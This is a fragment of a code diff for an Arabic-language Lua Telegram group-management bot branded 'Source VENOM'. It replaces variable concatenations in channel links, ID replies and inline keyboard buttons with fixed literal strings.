-send(msg.chat_id_, msg.id_,'[\n ¦✙ بيك عزيزي 「'..Name..'」 \n¦• 𝚄𝚂𝙴𝚁 ↝  「'..Name..'」    ↝💘\n¦• 𝙼𝚂𝙶𝚂↝ 「'..Msguser..'」.   ↝💘\n ¦• 𝚁𝙰𝙽𝙺↝ 「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」    ↝💘\n¦• 𝙸𝙳↝  「'..msg.sender_user_id_..'」    ↝💘\n¦• 𝒄𝒉↝   「@SOURCE'..VENOM..'」 ↝🇧??\n')
+send(msg.chat_id_, msg.id_,'[\n ¦✙ بيك عزيزي 「'..Name..'」 \n¦• 𝚄𝚂𝙴𝚁 ↝  「'..Name..'」    ↝💘\n¦• 𝙼𝚂𝙶𝚂↝ 「'..Msguser..'」.   ↝💘\n ¦• 𝚁𝙰𝙽𝙺↝ 「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」    ↝💘\n¦• 𝙸𝙳↝  「'..msg.sender_user_id_..'」    ↝💘\n¦• 𝒄𝒉↝   「@SOURCEVENOM」 ↝🇧??\n')
 else
-send(msg.chat_id_, msg.id_, '\n 𖥔 الصوره ⇜ ليس لديك صور في حسابك'..'[\n¦• 𝚄𝚂𝙴𝚁 ↝ 「'..username..'」\n¦• 𝙼𝚂𝙶𝚂↝ 「'..Msguser..'」\n¦• 𝙸𝙳↝  「'..msg.sender_user_id_..'」\n¦• 𝒄𝒉↝  「@SOURCE'..VENOM..'」\n')
+send(msg.chat_id_, msg.id_, '\n 𖥔 الصوره ⇜ ليس لديك صور في حسابك'..'[\n¦• 𝚄𝚂𝙴𝚁 ↝ 「'..username..'」\n¦• 𝙼𝚂𝙶𝚂↝ 「'..Msguser..'」\n¦• 𝙸𝙳↝  「'..msg.sender_user_id_..'」\n¦• 𝒄𝒉↝  「@SOURCEVENOM」\n')
 end 
 end
 end
@@ -13775,7 +13783,7 @@ get_id_text = get_id_text:gsub('#game',NUMPGAME)
 get_id_text = get_id_text:gsub('#photos',photps) 
 send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
 else
-send(msg.chat_id_, msg.id_,'[\n¦• 𝚄𝚂𝙴𝚁 ↝  '..username..' \n¦• 𝙼𝚂𝙶𝚂↝ '..Msguser..' \n¦• 𝚁𝙰𝙽𝙺↝ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'  \n¦• 𝙸𝙳↝  '..msg.sender_user_id_..' \n¦• 𝒄𝒉↝ @SOURCE'..VENOM..'  \n')
+send(msg.chat_id_, msg.id_,'[\n¦• 𝚄𝚂𝙴𝚁 ↝  '..username..' \n¦• 𝙼𝚂𝙶𝚂↝ '..Msguser..' \n¦• 𝚁𝙰𝙽𝙺↝ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'  \n¦• 𝙸𝙳↝  '..msg.sender_user_id_..' \n¦• 𝒄𝒉↝ @SOURCEVENOM  \n')
 end
 end
 
@@ -13865,12 +13873,12 @@ else
 username = 'لا يوجد '
 end
 if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
-sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, ban.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n• 🖤 | 𝑼𝑬𝑺 : '..username..' \n• 🖤 | 𝑴𝑺𝑮 : '..Msguser..' \n• 🖤 | 𝑺𝑻𝑨 : '..Rutba(msg.sender_user_id_,msg.chat_id_)..'  \n• 🖤 | 𝑰𝑫 :  '..msg.sender_user_id_..' \n• 🖤 | b𝐼𝑂 : '..getbioY..' \n• 🖤 | 𝐶𝐻 : @SOURCE'..VENOM..' \n')
+sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, ban.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n• 🖤 | 𝑼𝑬𝑺 : '..username..' \n• 🖤 | 𝑴𝑺𝑮 : '..Msguser..' \n• 🖤 | 𝑺𝑻𝑨 : '..Rutba(msg.sender_user_id_,msg.chat_id_)..'  \n• 🖤 | 𝑰𝑫 :  '..msg.sender_user_id_..' \n• 🖤 | b𝐼𝑂 : '..getbioY..' \n• 🖤 | 𝐶𝐻 : @SOURCEVENOM \n')
 else 
 if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
-send(msg.chat_id_, msg.id_,'[\n ¦✙ بيك عزيزي 「'..Name..'」 \n¦• 𝚄𝚂𝙴𝚁 ↝  「'..Name..'」    ↝💘\n¦• 𝙼𝚂𝙶𝚂↝ 「'..Msguser..'」.   ↝💘\n ¦• 𝚁𝙰𝙽𝙺↝ 「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」    ↝💘\n¦• 𝙸𝙳↝  「'..msg.sender_user_id_..'」    ↝💘\n¦• 𝒄𝒉↝   「@SOURCE'..VENOM..'」 ↝🇧??\n')
+send(msg.chat_id_, msg.id_,'[\n ¦✙ بيك عزيزي 「'..Name..'」 \n¦• 𝚄𝚂𝙴𝚁 ↝  「'..Name..'」    ↝💘\n¦• 𝙼𝚂𝙶𝚂↝ 「'..Msguser..'」.   ↝💘\n ¦• 𝚁𝙰𝙽𝙺↝ 「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」    ↝💘\n¦• 𝙸𝙳↝  「'..msg.sender_user_id_..'」    ↝💘\n¦• 𝒄𝒉↝   「@SOURCEVENOM」 ↝🇧??\n')
 else
-send(msg.chat_id_, msg.id_, '\n 𖥔 الصوره ⇜ ليس لديك صور في حسابك'..'[\n¦• 𝚄??𝙴𝚁 ↝ 「'..username..'」\n¦• 𝙼𝚂𝙶𝚂↝ 「'..Msguser..'」\n¦• 𝙸𝙳↝  「'..msg.sender_user_id_..'」\n¦• 𝒄𝒉↝  「@SOURCE'..VENOM..'」\n')
+send(msg.chat_id_, msg.id_, '\n 𖥔 الصوره ⇜ ليس لديك صور في حسابك'..'[\n¦• 𝚄??𝙴𝚁 ↝ 「'..username..'」\n¦• 𝙼𝚂𝙶𝚂↝ 「'..Msguser..'」\n¦• 𝙸𝙳↝  「'..msg.sender_user_id_..'」\n¦• 𝒄𝒉↝  「@SOURCEVENOM」\n')
 end 
 end
 end
@@ -13889,7 +13897,7 @@ get_id_text = get_id_text:gsub('#game',NUMPGAME)
 get_id_text = get_id_text:gsub('#photos',photps) 
 send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
 else
-send(msg.chat_id_, msg.id_,'[\n¦• 𝚄𝚂𝙴𝚁 ↝  '..username..' \n¦• 𝙼𝚂𝙶𝚂↝ '..Msguser..' \n¦• 𝚁𝙰𝙽𝙺↝ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'  \n¦• 𝙸𝙳↝  '..msg.sender_user_id_..' \n¦• 𝒄𝒉↝ @SOURCE'..VENOM..'  \n')
+send(msg.chat_id_, msg.id_,'[\n¦• 𝚄𝚂𝙴𝚁 ↝  '..username..' \n¦• 𝙼𝚂𝙶𝚂↝ '..Msguser..' \n¦• 𝚁𝙰𝙽𝙺↝ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'  \n¦• 𝙸𝙳↝  '..msg.sender_user_id_..' \n¦• 𝒄𝒉↝ @SOURCEVENOM  \n')
 end
 end
 
@@ -15768,7 +15776,7 @@ keyboard.inline_keyboard = {
 {text = '◗ متطوره◖', callback_data="/VNO"},
 },
 {
-{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCE"..VENOM..""},
+{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
@@ -15787,7 +15795,7 @@ keyboard.inline_keyboard = {
 {text = 'اوامر الاعضاء', callback_data="/change-names"},
 },
 {
-{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCE"..VENOM..""},
+{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
@@ -15833,7 +15841,7 @@ keyboard.inline_keyboard = {
 {text = '@Dlik', callback_data="/Dlik"},
 },
 {
-{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCE"..VENOM..""},
+{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
@@ -15919,7 +15927,7 @@ keyboard.inline_keyboard = {
 {text = '• الجوزاء 🌩', callback_data="/zguza"},{text = '• الدلو 🦯', callback_data="/zdlu"},
 },
 {
-{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCE"..VENOM..""},
+{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
@@ -15966,7 +15974,7 @@ if Time ~= os.date("%x") then
 local list = database:smembers(bot_id..'Chek:Groups') 
 local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
 for k,v in pairs(list) do   
-NAME = ''..VENOM..' Chat'
+NAME = 'VENOM Chat'
 link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_) or ''
 CoSu = database:smembers(bot_id..'CoSu'..v)
 ASAS = database:smembers(bot_id..'Basic:Constructor'..v)
@@ -15974,9 +15982,9 @@ MNSH = database:smembers(bot_id..'Constructor'..v)
 MDER = database:smembers(bot_id..'Manager'..v)
 MOD = database:smembers(bot_id..'Mod:User'..v)
 if k == 1 then
-t = t..'"'..v..'":{"'..VENOM..'":"'..NAME..'",'
+t = t..'"'..v..'":{"VENOM":"'..NAME..'",'
 else
-t = t..',"'..v..'":{"'..VENOM..'":"'..NAME..'",'
+t = t..',"'..v..'":{"VENOM":"'..NAME..'",'
 end
 if #ASAS ~= 0 then 
 t = t..'"ASAS":['
@@ -17441,7 +17449,7 @@ keyboard.inline_keyboard = {
 {{text = 'لعبه كشف الكذب', callback_data="/help47"}},
 {{text = 'مريم', callback_data="/help36"},{text = 'عقاب', callback_data="/help42"}},
 {{text = '◗القائمه الرائسيه◖', callback_data="/add"}},
-{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCE"..VENOM..""}},
+{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
 end
@@ -17569,7 +17577,7 @@ keyboard.inline_keyboard = {
 {{text = 'SkodaHockey1 ', url="https://t.me/gamee?game=SkodaHockey1"},{text = 'SummerLove', url="https://t.me/gamee?game=SummerLove"}},  
 {{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}},  
 {{text = '◗القائمه الرائسيه◖', callback_data="/add"}},
-{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCE"..VENOM..""}},
+{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
 end
@@ -17606,7 +17614,7 @@ keyboard.inline_keyboard = {
 {text = '◗القائمه الرائسيه◖', callback_data="/change-id"},
 },
 {
-{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCE"..VENOM..""},
+{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -17623,7 +17631,7 @@ keyboard.inline_keyboard = {
 {text = 'اوامر الاعضاء', callback_data="/change-names"},
 },
 {
-{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCE"..VENOM..""},
+{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -17647,7 +17655,7 @@ keyboard.inline_keyboard = {
 {{text = 'غنيلي', callback_data="/help17"}},
 {{text = 'نسبه جمالي', callback_data="/help18"},{text = 'اليتيوب', callback_data="/help24"}},
 {{text = '◗القائمه الرائسيه◖', callback_data="/add"}},
-{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCE"..VENOM..""}},
+{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
 end
@@ -17774,7 +17782,7 @@ keyboard.inline_keyboard = {
 {text = '◗ متطوره◖', callback_data="/VNO"},
 },
 {
-{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCE"..VENOM..""},
+{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
@@ -17810,7 +17818,7 @@ keyboard.inline_keyboard = {
 {text = '• الجوزاء 🌩', callback_data="/zguza"},{text = '• الدلو 🦯', callback_data="/zdlu"},
 },
 {
-{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCE"..VENOM..""},
+{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
@@ -17830,7 +17838,7 @@ keyboard.inline_keyboard = {
 {text = 'نبذه عن السورس', callback_data="/change-ghjjgyy"},
 },
 {
-{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCE"..VENOM..""},
+{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
@@ -17847,7 +17855,7 @@ local Teext =[[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = '˹ＤＥＶＩＤ༈˼',url="t.me/de_vi_d"},{text = '𓌹 ˹ＤＯＮＧＯＬ¹˼ 𓌺 ', url="t.me/UU_DO_N"}},
-{{text = '˹ᴛᴀᴡᴏsʟ˼',url="t.me/TEAM"..VENOM.."1"}}, 
+{{text = '˹ᴛᴀᴡᴏsʟ˼',url="t.me/TEAMVENOM1"}}, 
 {{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/change-hhh"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
@@ -17863,7 +17871,7 @@ local Teext =[[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = '˹الــمــبــرمــج بــانــدا˼', url="t.me/QSVNO"}},
-{{text = '˹تــواصــل بــانــدا˼',url="t.me/TEAM"..VENOM.."1"}}, 
+{{text = '˹تــواصــل بــانــدا˼',url="t.me/TEAMVENOM1"}}, 
 {{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/change-hhh"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
@@ -17883,8 +17891,8 @@ local Teext =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCE"..VENOM..""}},
-{{text = '˹تــواصــل الـسـورس˼',url="t.me/TEAM"..VENOM.."1"}}, 
+{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
+{{text = '˹تــواصــل الـسـورس˼',url="t.me/TEAMVENOM1"}}, 
 {{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/change-hhh"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
@@ -17897,7 +17905,7 @@ keyboard = {}
 keyboard.inline_keyboard = {
 {{text = '˹ʙᴀɴᴅᴀ ғᴜᴄᴋ σғғ↺˼',url="t.me/Q_0_ll"},{text = '˹𖢜 𝗔𝗛𝗠𝗘𝗗 ⤶˼ ', url="t.me/AY_AHD"}},
 {{text = '˹ＤＥＶＩＤ༈˼',url="t.me/de_vi_d"},{text = '𓌹 ˹ＤＯＮＧＯＬ¹˼ 𓌺 ', url="t.me/UU_DO_N"}},
-{{text = '˹ᴛᴀᴡᴏsʟ˼',url="t.me/TEAM"..VENOM.."1"}}, 
+{{text = '˹ᴛᴀᴡᴏsʟ˼',url="t.me/TEAMVENOM1"}}, 
 {{text = '𖥔 مــطــور الــبــوت 𖥔', url="http://t.me/"..sudos.UserName}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
@@ -17921,8 +17929,8 @@ local Teext =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙴𝙽𝙾𝙼 2⤶',url="t.me/SOURCE"..VENOM.."2"},{text = 'SOURCE"..VENOM.."1', url="t.me/SOURCE"..VENOM.."1"}},
-{{text = 'SOURCE"..VENOM.."3',url="t.me/SOURCE"..VENOM.."5"}},
+{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙴𝙽𝙾𝙼 2⤶',url="t.me/SOURCEVENOM2"},{text = 'SOURCEVENOM1', url="t.me/SOURCEVENOM1"}},
+{{text = 'SOURCEVENOM3',url="t.me/SOURCEVENOM5"}},
 {{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/HHH"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
@@ -17935,7 +17943,7 @@ keyboard = {}
 keyboard.inline_keyboard = {
 {{text = '•ʙᴀɴᴅᴀ♪',url="t.me/Q_0_ll"},{text = '•ᴀʜᴍᴀᴅ♪', url="t.me/AY_AHD"}},
 {{text = '•ᴅᴇᴠɪᴅ♪',url="t.me/de_vi_d"},{text = '•ᴅᴏɴɢᴏʟ♪', url="t.me/UU_DO_N"}},
-{{text = '•ᴛᴀᴡᴏsʟ♪',url="t.me/TEAM"..VENOM.."1"}}, 
+{{text = '•ᴛᴀᴡᴏsʟ♪',url="t.me/TEAMVENOM1"}}, 
 {{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/HHH"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
@@ -20022,13 +20030,13 @@ if database:get(bot_id..'Set:array'..data.sender_user_id_..':'..Chat_id) == 'tru
 database:del(bot_id..'Set:array'..data.sender_user_id_..':'..Chat_id)
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ',url='http://t.me/SOURCE'..'..VENOM..'..''}},
+{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ',url='http://t.me/SOURCEVENOM'}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" 𖥔︙تم حفظ الردود بنجاح*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 else
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ',url='http://t.me/SOURCE'..'..VENOM..'..''}},
+{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ',url='http://t.me/SOURCEVENOM'}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" 𖥔︙تم تنفيذ الامر سابقا*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -20038,28 +20046,28 @@ tdcli_function({ID="ChangeChatMemberStatus",chat_id_=Chat_id,user_id_=data.sende
 if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ',url='http://t.me/SOURCE'..'..VENOM..'..''}},
+{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ',url='http://t.me/SOURCEVENOM'}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" 𖥔︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
 if (data and data.code_ and data.code_ == 3) then 
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ',url='http://t.me/SOURCE'..'..VENOM..'..''}},
+{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ',url='http://t.me/SOURCEVENOM'}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" 𖥔︙البوت ليس ادمن يرجى ترقيتي !*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
 if data and data.code_ and data.code_ == 400 and data.message_ == "USER_ADMIN_INVALID" then 
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ',url='http://t.me/SOURCE'..'..VENOM..'..''}},
+{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ',url='http://t.me/SOURCEVENOM'}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" 𖥔︙عذرا لا استطيع طرد ادمنية الكروب*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
 if data and data.ID and data.ID == 'Ok' then
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ',url='http://t.me/SOURCE'..VENOM..''}},
+{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ',url='http://t.me/SOURCEVENOM'}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" 𖥔︙تم الطرد بنجاح*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -20069,7 +20077,7 @@ if Text == 'noKikedMe'..data.sender_user_id_ then
 local Text ="𖥔 تم الغاء الطرد بنجاح "
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ',url='http://t.me/SOURCE'..VENOM..''}},
+{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ',url='http://t.me/SOURCEVENOM'}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -20486,13 +20494,13 @@ return false
 end  
 end 
 ------------------------------------------------------------------------
-local VENOMAbot = database:get(bot_id..""..VENOM.."1:Add:Filter:Rp2"..text..result.chat_id_)   
+local VENOMAbot = database:get(bot_id.."VENOM1:Add:Filter:Rp2"..text..result.chat_id_)   
 if VENOMAbot then    
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 if data.username_ ~= false then
 send(msg.chat_id_,0," 𖥔 الـعـضو  : {["..data.first_name_.."](T.ME/"..data.username_..")}\n 𖥔 ["..VENOMAbot.."] \n") 
 else
-send(msg.chat_id_,0," 𖥔 الـعـضو  : {["..data.first_name_.."](T.ME/SOURCE"..VENOM..")}\n 𖥔 ["..VENOMAbot.."] \n") 
+send(msg.chat_id_,0," 𖥔 الـعـضو  : {["..data.first_name_.."](T.ME/SOURCEVENOM)}\n 𖥔 ["..VENOMAbot.."] \n") 
 end
 end,nil)   
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
